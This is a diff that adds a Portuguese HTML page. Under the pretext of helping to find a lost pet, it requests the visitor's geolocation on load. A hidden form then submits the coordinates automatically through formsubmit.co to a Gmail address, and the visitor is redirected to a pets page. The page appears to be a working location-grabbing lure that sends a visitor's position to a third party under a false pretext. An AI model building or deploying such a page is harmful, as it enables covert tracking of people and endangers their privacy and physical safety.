@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Compartilhe Sua Localização</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
+    h1 {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h1>Compartilhe sua localização</h1>
+  <p>Para ajudar a encontrar o pet, por favor, permita o acesso à sua localização.</p>
+  
+  <!-- Formulário oculto para enviar a localização -->
+  <form id="locationForm" action="https://formsubmit.co/pesquisashercules@gmail.com" method="POST">
+    <!-- Campos preenchidos via JavaScript -->
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+    <!-- Define o assunto do e-mail -->
+    <input type="hidden" name="_subject" value="Localização compartilhada">
+    <!-- Redirecionamento após o envio -->
+    <input type="hidden" name="_next" value="pets.html">
+  </form>
+  
+  <script>
+    // Verifica se o navegador suporta a API de geolocalização
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(onSuccess, onError);
+    } else {
+      alert("Seu navegador não suporta geolocalização.");
+      window.location.href = "pets.html";
+    }
+    
+    function onSuccess(position) {
+      // Preenche os campos com a latitude e longitude
+      document.getElementById("latitude").value = position.coords.latitude;
+      document.getElementById("longitude").value = position.coords.longitude;
+      // Submete o formulário para enviar os dados para o FormSubmit
+      document.getElementById("locationForm").submit();
+    }
+    
+    function onError(error) {
+      console.warn("Erro ao obter localização:", error);
+      // Mesmo se ocorrer erro, redireciona o usuário para a página dos pets
+      window.location.href = "pets.html";
+    }
+  </script>
+</body>
+</html>
